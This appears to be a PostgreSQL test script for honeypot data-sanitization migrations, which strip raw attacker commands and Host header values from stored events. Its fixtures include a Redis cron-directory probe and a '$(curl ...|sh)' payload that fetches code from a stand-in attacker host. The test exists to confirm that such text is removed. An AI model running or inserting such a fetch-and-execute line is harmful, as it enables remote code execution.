-- Verifies the metadata cleansing migrations:
-- * OpenCanary cmd -> allowlisted cmd_verb + cmd_length
-- * HTTP Host header value -> host_kind
-- Both must remove the raw value and be idempotent.
-- Rolls back all fixtures.
\set ON_ERROR_STOP on

begin;

insert into public.sensors (id, name, type, region, is_active)
values ('sensor-meta-01', 'Metadata Sensor', 'combined', 'us-east-1', true);

insert into public.attack_events (
  id, sensor_id, observed_at, protocol, dst_port, event_type, attack_category,
  src_ip_hash, metadata
) values
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc1', 'sensor-meta-01', timestamptz '2026-11-21 01:00:00+00',
   'redis', 6379, 'redis_command_probe', 'auth_attempt', 'hash-m1',
   '{"logtype": 17001, "cmd": "config set dir /var/spool/cron"}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc2', 'sensor-meta-01', timestamptz '2026-11-21 01:01:00+00',
   'redis', 6379, 'redis_command_probe', 'auth_attempt', 'hash-m2',
   '{"logtype": 17001, "cmd": "$(curl http://evil.invalid/x|sh)"}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc3', 'sensor-meta-01', timestamptz '2026-11-21 01:02:00+00',
   'ssh', 22, 'ssh_remote_version', 'auth_attempt', 'hash-m3',
   '{"logtype": 4001, "remoteversion": "SSH-2.0-Go"}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc4', 'sensor-meta-01', timestamptz '2026-11-21 01:03:00+00',
   'http', 80, 'http_probe', 'http_path_probe', 'hash-m4',
   '{"headers": {"host": "203.0.113.10:80", "user-agent": "scanner"}}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc5', 'sensor-meta-01', timestamptz '2026-11-21 01:04:00+00',
   'http', 80, 'http_probe', 'http_path_probe', 'hash-m5',
   '{"headers": {"host": "[2001:db8::1]:443"}}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc6', 'sensor-meta-01', timestamptz '2026-11-21 01:05:00+00',
   'http', 80, 'http_probe', 'http_path_probe', 'hash-m6',
   '{"headers": {"host": "victim-corp.example:8443"}}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc7', 'sensor-meta-01', timestamptz '2026-11-21 01:06:00+00',
   'http', 80, 'http_probe', 'http_path_probe', 'hash-m7',
   '{"headers": {"host": "  "}}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc8', 'sensor-meta-01', timestamptz '2026-11-21 01:07:00+00',
   'http', 80, 'http_probe', 'http_path_probe', 'hash-m8',
   '{"headers": {"user-agent": "no-host"}}');

\ir ../migrations/20261123000001_sanitize_opencanary_cmd_metadata.sql
\ir ../migrations/20261123000002_replace_host_header_with_kind.sql
-- Second run must be a no-op.
\ir ../migrations/20261123000001_sanitize_opencanary_cmd_metadata.sql
\ir ../migrations/20261123000002_replace_host_header_with_kind.sql

do $$
declare
  v_remaining integer;
  v_m1 jsonb;
  v_m2 jsonb;
  v_m3 jsonb;
begin
  select count(*) into v_remaining
  from public.attack_events
  where sensor_id = 'sensor-meta-01' and metadata ? 'cmd';
  if v_remaining <> 0 then
    raise exception 'raw cmd metadata remains on % rows', v_remaining;
  end if;

  select metadata into v_m1 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc1';
  select metadata into v_m2 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc2';
  select metadata into v_m3 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc3';

  if v_m1 <> '{"logtype": 17001, "cmd_verb": "CONFIG", "cmd_length": 30}'::jsonb then
    raise exception 'unexpected sanitized metadata for allowlisted verb: %', v_m1;
  end if;
  if v_m2 <> '{"logtype": 17001, "cmd_verb": "OTHER", "cmd_length": 32}'::jsonb then
    raise exception 'unexpected sanitized metadata for unknown command: %', v_m2;
  end if;
  if v_m3 <> '{"logtype": 4001, "remoteversion": "SSH-2.0-Go"}'::jsonb then
    raise exception 'rows without cmd must be untouched: %', v_m3;
  end if;
  if v_m1::text like '%/var/spool%' or v_m2::text like '%evil.invalid%' then
    raise exception 'attacker command text persisted after cleansing';
  end if;

  select count(*) into v_remaining
  from public.attack_events
  where sensor_id = 'sensor-meta-01' and metadata->'headers' ? 'host';
  if v_remaining <> 0 then
    raise exception 'Host header values remain on % rows', v_remaining;
  end if;

  if (select metadata from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc4')
     <> '{"headers": {"user-agent": "scanner"}, "host_kind": "ip_literal"}'::jsonb then
    raise exception 'IPv4 Host was not replaced with ip_literal';
  end if;
  if (select metadata->>'host_kind' from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc5') <> 'ip_literal' then
    raise exception 'IPv6 Host was not classified as ip_literal';
  end if;
  if (select metadata->>'host_kind' from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc6') <> 'hostname' then
    raise exception 'hostname Host was not classified as hostname';
  end if;
  if (select metadata->>'host_kind' from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc7') <> 'absent' then
    raise exception 'blank Host was not classified as absent';
  end if;
  if (select metadata from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc8')
     <> '{"headers": {"user-agent": "no-host"}}'::jsonb then
    raise exception 'rows without a Host header must be untouched';
  end if;
  if exists (
    select 1 from public.attack_events
    where sensor_id = 'sensor-meta-01'
      and (metadata::text like '%203.0.113.10%' or metadata::text like '%2001:db8%' or metadata::text like '%victim-corp%')
  ) then
    raise exception 'Host header value persisted after cleansing';
  end if;
end;
$$;

rollback;
